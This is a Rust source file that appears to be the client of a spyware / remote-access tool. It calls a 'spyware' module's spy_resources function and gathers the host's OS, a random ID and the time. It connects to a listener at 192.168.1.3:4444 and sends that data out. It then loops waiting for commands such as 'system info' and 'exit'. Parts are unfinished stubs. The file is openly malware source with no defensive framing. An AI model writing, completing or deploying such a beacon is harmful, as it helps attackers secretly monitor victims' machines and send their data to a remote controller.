#[allow(unused_assignments)]
#[allow(non_snake_case)]
#[allow(unused_imports)]
#[allow(non_snake_case)]

use std::net::TcpStream;
use std::io::prelude::*;
use rand::Rng;
use std::env;
use chrono::{self, Local, DateTime};
use tabled::{Table, Style, Tabled};

//  M O D S
mod spyware;

const DATA:usize = 1024;

fn main()
{
    let id = rand::thread_rng().gen_range(1000..9000);
    let os = env::consts::OS;
    let time =  chrono::offset::Local::now();

    #[derive(Tabled)]
    struct Info {
        ID: u16,
        OS: &'static str,
        TIME: DateTime<Local>,
        IP: &'static str,
    }

    let info = vec![
        Info{
            ID:   id,
            OS:   os,
            TIME: time,
            IP: "192.168.1.5", // LEFT TO DO
        },
    ];

    let table = Table::new(info).with(Style::rounded()).to_string();
    spyware::spy_resources();

    let mut stream = TcpStream::connect("192.168.1.3:4444").expect("");
    stream.write(table.as_bytes()).expect("");


    loop
    {
        let mut buff = vec![0; DATA];
        match stream.read(&mut buff) 
        {
            Ok(_) => {
                let msg = buff.into_iter().take_while(|&x| x != 0).collect::<Vec<_>>();
                let msg = String::from_utf8(msg).expect("Invalid utf8 message");
                println!("{msg:?}");
                if msg == "system info"
                {
                    stream.write(b"[*] SENDING SYSTEM INFO").expect("");
                }
                else if msg == "exit"{break;}
            }
            Err(_) => {
                
            }
        }

    }
}
